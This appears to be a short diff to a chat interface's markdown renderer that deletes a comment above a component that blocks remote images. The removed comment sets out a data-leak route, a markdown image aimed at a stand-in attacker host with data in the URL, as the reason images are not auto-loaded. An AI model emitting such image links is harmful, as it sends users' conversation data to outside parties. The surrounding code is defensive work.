@@ -35,8 +35,6 @@ function PreBlock(props: ComponentPropsWithoutRef<"pre">) {
   );
 }
 
-// A remote image loads the moment it renders, so ![](https://attacker/?d=<data>) would leak
-// anything the model was told. Images are never auto-loaded; the destination is shown instead.
 function BlockedImage(props: ComponentPropsWithoutRef<"img">) {
   const src = typeof props.src === "string" ? props.src : "";
   let host = "";
